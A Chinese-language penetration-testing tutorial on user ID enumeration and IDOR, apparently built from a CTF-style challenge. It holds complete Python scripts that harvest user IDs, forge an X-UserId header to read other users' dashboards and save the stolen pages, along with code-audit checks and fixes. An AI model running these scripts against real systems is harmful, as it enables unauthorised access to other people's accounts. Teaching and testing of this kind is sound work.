# 用户 ID 枚举攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的用户 ID 枚举检测与利用流程，帮助识别系统中存在的用户标识符信息泄露问题。

## 1.2 适用范围

本文档适用于所有在响应中暴露用户 ID 的 Web 应用，特别是：
- 在 HTML 隐藏字段中显示用户 ID 的应用
- 在 JavaScript 变量中嵌入用户 ID 的应用
- 在 API 响应中返回用户 ID 的应用
- 在 URL 路径中包含用户 ID 的应用

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

用户 ID 枚举是指攻击者通过应用程序的响应内容（HTML、JavaScript、API 响应等）获取有效用户的内部标识符，从而为后续的 IDOR、水平权限绕过等攻击提供目标。

**本质问题**：
- 应用程序在客户端暴露内部用户标识符
- 未对用户 ID 等敏感信息进行适当隐藏
- 在认证前就显示用户特定信息

### 技术细节

**常见暴露点**：

```html
<!-- HTML 隐藏字段 -->
<input type="hidden" name="user_id" value="10032">

<!-- JavaScript 变量 -->
<script>
    var userId = 10032;
    var config = {
        'X-UserId': '10032'
    };
</script>

<!-- URL 路径 -->
https://target.com/user/10032/profile

<!-- API 响应 -->
{
    "user_id": 10032,
    "username": "test"
}
```

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-200 | 敏感信息暴露 |
| CWE-284 | 不当访问控制 |
| CWE-639 | 参数化访问控制不当 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 密码重置页 | `/password/<username>` | 显示用户 ID 和真实姓名 |
| 个人资料页 | `/profile` | 显示用户 ID 用于表单提交 |
| 订单确认页 | `/order/confirm` | 暴露订单 ID 和用户 ID |
| 设置页面 | `/settings` | 隐藏字段包含用户 ID |
| 单页应用 | 前端路由 | JavaScript 中存储用户 ID |
| 文件上传 | 上传表单 | 表单包含用户 ID 隐藏字段 |

## 2.3 漏洞发现方法

### 2.3.1 黑盒测试

**HTML 隐藏字段检测**：

```bash
# 访问密码页面（无需认证）
curl http://target.com/password/test \
  | grep -i "user_id\|userid"

# 提取用户 ID
curl -s http://target.com/password/test \
  | grep -oP 'name="user_id" value="\K\d+'

# 批量测试多个用户名
for user in test admin user flag; do
    echo "Testing: $user"
    curl -s "http://target.com/password/$user" \
      | grep -oP 'name="user_id" value="\K\d+'
done
```

**JavaScript 变量检测**：

```bash
# 检查页面中的 JavaScript
curl http://target.com/password/test \
  | grep -oP "userId.*?=\s*\K\d+"

# 检查配置对象
curl http://target.com/password/test \
  | grep -oP "'X-UserId':\s*'\K\d+"

# 提取内联脚本
curl -s http://target.com/password/test \
  | grep -oP '<script[^>]*>\s*var\s+\w+\s*=\s*\K[^<]+'
```

**API 响应检测**：

```bash
# 检查 API 端点
curl http://target.com/api/user/me \
  | jq '.id, .user_id'

# 检查 GraphQL
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user { id username } }"}' \
  | jq '.data.user.id'
```

### 2.3.2 白盒测试

**代码审计要点**：

```python
# 检查视图函数中是否暴露用户 ID
# ❌ 危险代码示例
@app.route('/password/<username>')
def password_page(username):
    user = User.query.filter_by(username=username).first()
    # 暴露 user_id 到模板
    return render_template('password.html', 
                          user_id=user.id,  # ❌ 危险
                          first_name=user.first_name)

# ✅ 安全代码示例
@app.route('/password/<username>')
def password_page(username):
    user = User.query.filter_by(username=username).first()
    # 不暴露 user_id
    return render_template('password.html', 
                          first_name=user.first_name)
```

**模板文件检查**：

```bash
# 搜索模板中暴露 user_id 的地方
grep -rn "user_id" --include="*.html" .
grep -rn "userId" --include="*.js" .

# 检查隐藏字段
grep -rn 'type="hidden"' --include="*.html" .
grep -rn 'name="user_id"' --include="*.html" .
```

### 2.3.3 自动化检测脚本

```python
#!/usr/bin/env python3
"""
User ID Enumeration Detection Script
检测用户 ID 枚举漏洞
"""

import requests
import re
import sys

class UserIDEnumerator:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
    
    def extract_user_id_from_html(self, url):
        """从 HTML 页面提取用户 ID"""
        try:
            response = self.session.get(url)
            html = response.text
            
            # 模式 1：隐藏字段
            patterns = [
                r'name="user_id"\s+value="(\d+)"',
                r'name="userId"\s+value="(\d+)"',
                r'id="user_id"\s+value="(\d+)"',
                r"'X-UserId':\s*'(\d+)'",
                r'"X-UserId":\s*"(\d+)"',
                r'userId\s*=\s*(\d+)',
                r'user_id\s*=\s*(\d+)',
            ]
            
            for pattern in patterns:
                match = re.search(pattern, html)
                if match:
                    return match.group(1)
            
            return None
        except Exception as e:
            return None
    
    def enumerate_usernames(self, usernames):
        """批量枚举用户名对应的用户 ID"""
        results = {}
        
        for username in usernames:
            url = f'{self.base_url}/password/{username}'
            user_id = self.extract_user_id_from_html(url)
            
            if user_id:
                results[username] = user_id
                print(f"[+] {username}: {user_id}")
            else:
                print(f"[-] {username}: Not found")
        
        return results
    
    def check_idor_vulnerability(self, user_id):
        """检查是否存在 IDOR 漏洞"""
        # 尝试访问其他用户的数据
        test_url = f'{self.base_url}/dashboard'
        response = self.session.get(
            test_url,
            headers={'X-UserId': user_id}
        )
        
        if response.status_code == 200:
            print(f"[!] Potential IDOR with user_id: {user_id}")
            return True
        return False

def main():
    if len(sys.argv) < 2:
        print("Usage: python user_id_enum.py <base_url> [userlist]")
        print("Example: python user_id_enum.py http://target.com usernames.txt")
        sys.exit(1)
    
    base_url = sys.argv[1]
    userlist = sys.argv[2] if len(sys.argv) > 2 else None
    
    enumerator = UserIDEnumerator(base_url)
    
    if userlist:
        with open(userlist, 'r') as f:
            usernames = [line.strip() for line in f if line.strip()]
    else:
        # 默认用户名列表
        usernames = ['test', 'admin', 'user', 'flag']
    
    print(f"[*] Enumerating user IDs for {len(usernames)} usernames...")
    results = enumerator.enumerate_usernames(usernames)
    
    print(f"\n[+] Found {len(results)} user IDs:")
    for username, user_id in results.items():
        print(f"  {username} -> {user_id}")

if __name__ == '__main__':
    main()
```

## 2.4 漏洞利用方法

### 2.4.1 基础信息收集

```bash
# 获取单个用户的 ID
curl -s http://target.com/password/test \
  | grep -oP 'name="user_id" value="\K\d+'
# 输出：10032

# 获取用户真实姓名
curl -s http://target.com/password/test \
  | grep -oP 'Welcome, \K[^!]+'
# 输出：John

# 完整用户画像
echo "Username: test"
echo "User ID: $(curl -s http://target.com/password/test | grep -oP 'name=\"user_id\" value=\"\K\d+')"
echo "First Name: $(curl -s http://target.com/password/test | grep -oP 'Welcome, \K[^!]+')"
```

### 2.4.2 批量用户映射

```python
#!/usr/bin/env python3
"""
批量创建用户名到用户 ID 的映射
"""

import requests
import re
import json

BASE_URL = 'http://target.com'

def get_user_profile(username):
    """获取用户完整信息"""
    response = requests.get(f'{BASE_URL}/password/{username}')
    html = response.text
    
    profile = {
        'username': username,
        'user_id': None,
        'first_name': None
    }
    
    # 提取用户 ID
    id_match = re.search(r'name="user_id" value="(\d+)"', html)
    if id_match:
        profile['user_id'] = id_match.group(1)
    
    # 提取真实姓名
    name_match = re.search(r'Welcome, ([^!]+)!', html)
    if name_match:
        profile['first_name'] = name_match.group(1)
    
    return profile

def main():
    # 已知用户名列表
    usernames = ['test', 'admin', 'user1', 'user2', 'flag']
    
    profiles = []
    for username in usernames:
        profile = get_user_profile(username)
        if profile['user_id']:
            profiles.append(profile)
            print(f"[+] {username}:")
            print(f"    ID: {profile['user_id']}")
            print(f"    Name: {profile['first_name']}")
    
    # 保存为 JSON
    with open('user_mapping.json', 'w') as f:
        json.dump(profiles, f, indent=2)
    
    print(f"\n[*] Saved {len(profiles)} profiles to user_mapping.json")

if __name__ == '__main__':
    main()
```

### 2.4.3 结合 IDOR 攻击

```python
#!/usr/bin/env python3
"""
结合用户 ID 枚举和 IDOR 攻击
"""

import requests

BASE_URL = 'http://target.com'
SESSION_COOKIE = 'eyJ1c2VyX2lkIjoxMDAzMn0.aQJLkw.G_vN7rMPblvzl3mCx7N0HlrDNCQ'

# 通过枚举获得的用户 ID 列表
TARGET_USERS = {
    'test': '10032',
    'admin': '10001',
    'flag': '10052'
}

def access_user_dashboard(user_id):
    """访问指定用户的仪表板"""
    response = requests.get(
        f'{BASE_URL}/dashboard',
        cookies={'session': SESSION_COOKIE},
        headers={'X-UserId': user_id}
    )
    return response.text

def main():
    print("[*] Starting IDOR attack with enumerated user IDs...")
    
    for username, user_id in TARGET_USERS.items():
        print(f"\n[*] Targeting: {username} (ID: {user_id})")
        
        data = access_user_dashboard(user_id)
        
        if 'Welcome' in data:
            print(f"[+] Successfully accessed {username}'s dashboard")
            
            # 提取敏感信息
            if 'FLAG' in data:
                import re
                flag = re.search(r'FLAG\{[^}]+\}', data)
                if flag:
                    print(f"[!] FLAG FOUND: {flag.group()}")
            
            # 保存数据
            with open(f'stolen_{username}.html', 'w') as f:
                f.write(data)

if __name__ == '__main__':
    main()
```

### 2.4.4 用户 ID 范围探测

```python
#!/usr/bin/env python3
"""
探测用户 ID 的取值范围
"""

import requests
import time

BASE_URL = 'http://target.com'

def check_user_exists(user_id):
    """检查用户 ID 是否存在"""
    try:
        # 方法 1：通过密码页面
        response = requests.get(f'{BASE_URL}/password/invalid')
        if f'value="{user_id}"' in response.text:
            return False
        
        # 方法 2：通过 X-UserId 头部测试
        session = requests.Session()
        session.post(f'{BASE_URL}/', data={'username': 'test'})
        session.post(f'{BASE_URL}/password/test', data={'password': 'test'})
        
        response = session.get(
            f'{BASE_URL}/dashboard',
            headers={'X-UserId': str(user_id)}
        )
        
        if response.status_code == 200 and 'Welcome' in response.text:
            return True
        
        return False
    except:
        return False

def main():
    print("[*] Scanning for valid user IDs...")
    
    valid_ids = []
    
    # 扫描常见 ID 范围
    for user_id in range(10000, 10100):
        if check_user_exists(user_id):
            print(f"[+] Valid user ID: {user_id}")
            valid_ids.append(user_id)
        
        # 避免触发速率限制
        time.sleep(0.1)
    
    print(f"\n[+] Found {len(valid_ids)} valid user IDs:")
    print(valid_ids)

if __name__ == '__main__':
    main()
```

## 2.5 漏洞利用绕过方法

### 2.5.1 绕过前端隐藏

```bash
# 如果用户 ID 在渲染后被移除，检查原始 HTML
curl -s http://target.com/password/test > raw.html

# 使用不同的 User-Agent
curl -s -A "Mozilla/5.0" http://target.com/password/test \
  | grep "user_id"

# 检查 JavaScript 渲染前的内容
curl -s http://target.com/password/test \
  | grep -oP 'data-user-id="\K\d+'
```

### 2.5.2 绕过动态加载

```python
# 如果用户 ID 通过 AJAX 动态加载
import requests

# 先获取页面，再触发 AJAX
session = requests.Session()
response = session.get('http://target.com/password/test')

# 查找 AJAX 端点
import re
ajax_endpoints = re.findall(r'fetch\(\'([^\']+)\'', response.text)

for endpoint in ajax_endpoints:
    ajax_response = session.get(f'http://target.com{endpoint}')
    print(f"AJAX Response: {ajax_response.text}")
```

### 2.5.3 编码绕过

```bash
# 如果用户 ID 被编码
# Base64 编码
echo "10032" | base64
# MTAwMzIK

# URL 编码
python3 -c "from urllib.parse import quote; print(quote('10032'))"
# 10032

# Hex 编码
python3 -c "print('10032'.encode().hex())"
# 3130303332
```

---

# 第三部分：附录

## 3.1 用户 ID 枚举 Payload 速查表

| 测试位置 | 测试 Payload | 成功特征 |
|---------|-------------|---------|
| HTML 隐藏字段 | `name="user_id"` | 找到 `value="数字"` |
| JavaScript 变量 | `userId = ` | 找到数字赋值 |
| API 响应 | `/api/user/me` | JSON 包含 id 字段 |
| URL 路径 | `/user/{id}/` | 路径包含数字 ID |
| HTTP 头部 | `X-User-ID` | 响应包含用户数据 |

## 3.2 常见用户名列表

```
# 常见测试用户名
test
admin
administrator
root
user
guest
demo

# 企业常见用户名
john
jane
admin
support
info
contact
webmaster

# CTF 常见用户名
flag
ctf
admin
root
secret
```

## 3.3 完整攻击脚本

```python
#!/usr/bin/env python3
"""
User ID Enumeration + IDOR Complete Attack
完整攻击链：枚举 → 映射 → 利用
"""

import requests
import re
import json
import sys

class UserIDAttack:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.user_mapping = {}
    
    def enumerate_user_id(self, username):
        """枚举用户 ID"""
        response = self.session.get(f'{self.base_url}/password/{username}')
        
        # 从隐藏字段提取
        id_match = re.search(r'name="user_id" value="(\d+)"', response.text)
        if id_match:
            return id_match.group(1)
        
        # 从 JavaScript 提取
        js_match = re.search(r"'X-UserId': '(\d+)'", response.text)
        if js_match:
            return js_match.group(1)
        
        return None
    
    def authenticate(self, username, password):
        """认证获取会话"""
        self.session.post(f'{self.base_url}/',
                         data={'username': username},
                         allow_redirects=False)
        
        response = self.session.post(
            f'{self.base_url}/password/{username}',
            data={'password': password},
            allow_redirects=False
        )
        
        return 'dashboard' in response.headers.get('Location', '')
    
    def access_user_data(self, user_id):
        """访问用户数据"""
        response = self.session.get(
            f'{self.base_url}/dashboard',
            headers={'X-UserId': user_id}
        )
        return response.text
    
    def run_full_attack(self, attack_user, attack_pass, target_users):
        """执行完整攻击"""
        print(f"[*] Step 1: Authenticating as {attack_user}...")
        if not self.authenticate(attack_user, attack_pass):
            print("[-] Authentication failed")
            return False
        
        print(f"[*] Step 2: Enumerating target user IDs...")
        for target in target_users:
            user_id = self.enumerate_user_id(target)
            if user_id:
                self.user_mapping[target] = user_id
                print(f"[+] {target}: {user_id}")
            else:
                print(f"[-] {target}: Not found")
        
        print(f"[*] Step 3: Accessing target user data...")
        results = {}
        for target, user_id in self.user_mapping.items():
            data = self.access_user_data(user_id)
            
            if 'FLAG' in data:
                flag_match = re.search(r'FLAG\{[^}]+\}', data)
                if flag_match:
                    results[target] = flag_match.group(0)
                    print(f"[!] FLAG from {target}: {flag_match.group(0)}")
        
        return results

def main():
    if len(sys.argv) < 5:
        print("Usage: python user_id_attack.py <base_url> <attack_user> <attack_pass> <target1> [target2...]")
        sys.exit(1)
    
    base_url = sys.argv[1]
    attack_user = sys.argv[2]
    attack_pass = sys.argv[3]
    targets = sys.argv[4:]
    
    attacker = UserIDAttack(base_url)
    results = attacker.run_full_attack(attack_user, attack_pass, targets)
    
    if results:
        print(f"\n[+] Attack successful! Flags captured: {len(results)}")
        for target, flag in results.items():
            print(f"  {target}: {flag}")
    else:
        print("\n[-] Attack failed")

if __name__ == '__main__':
    main()
```

## 3.4 修复建议

1. **移除客户端用户 ID 暴露** - 不在 HTML/JS 中显示用户 ID
2. **使用会话存储** - 用户 ID 仅存储在服务端会话中
3. **使用不可预测 ID** - 使用 UUID 代替自增 ID
4. **实施访问控制** - 即使暴露 ID 也需要验证访问权限
5. **最小信息原则** - 只向客户端发送必要的信息

---

**文档版本**：1.0
**最后更新**：2026-03-08
**参考来源**：XBEN-003-24 渗透测试实战
